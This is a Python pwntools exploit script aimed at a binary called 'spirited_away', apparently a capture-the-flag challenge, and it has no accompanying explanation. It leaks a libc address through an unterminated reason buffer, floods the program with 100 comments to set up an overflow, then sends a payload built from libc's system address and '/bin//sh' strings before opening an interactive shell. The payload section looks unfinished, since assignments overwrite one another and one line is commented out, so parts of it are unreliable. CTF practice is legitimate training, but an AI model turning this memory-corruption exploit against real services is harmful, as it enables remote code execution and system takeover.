from pwn import *

#io = process('./spirited_away', env={"LD_PRELOAD":"./libc_32.so.6"})
io = process('./spirited_away')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')


def new_comment(name, age, reason, comment, choice = 'y'):
    print(io.recvuntil(b'Please enter your name: '))
    io.sendline(name)
    print(io.recvuntil(b'Please enter your age: '))
    io.sendline(str(age))
    print(io.recvuntil(b'Why did you came to see this movie? '))
    io.sendline(reason)
    print(io.recvuntil(b'Please enter your comment: '))
    io.sendline(comment)
    print(io.recvuntil(b'Would you like to leave another comment? <y/n>: '))
    io.sendline(choice)


print(io.recvuntil(b'Please enter your name: '))
io.sendline('A')
print(io.recvuntil(b'Please enter your age: '))
io.sendline(str(1))
print(io.recvuntil(b'Why did you came to see this movie? '))
io.sendline('A'*19)
print(io.recvuntil(b'Please enter your comment: '))
io.sendline('A')
print(io.recvuntil('Reason: '))
print(io.recv(20))
libc.address = u32(io.recv(4)) - 0x5fe0b
print(hex(libc.address))
print(io.recvuntil(b'Would you like to leave another comment? <y/n>: '))
io.sendline('y')

for i in range(100):
    new_comment('A', '+', 'A', 'A')



pl = p32(libc.sym['system'])#+p32(next(libc.search(b'/bin/sh')))
pl = pl * 28
pl = '/bin//sh'*14
pause()

new_comment('A', '1', pl, 'A', choice = 'n')
io.interactive()
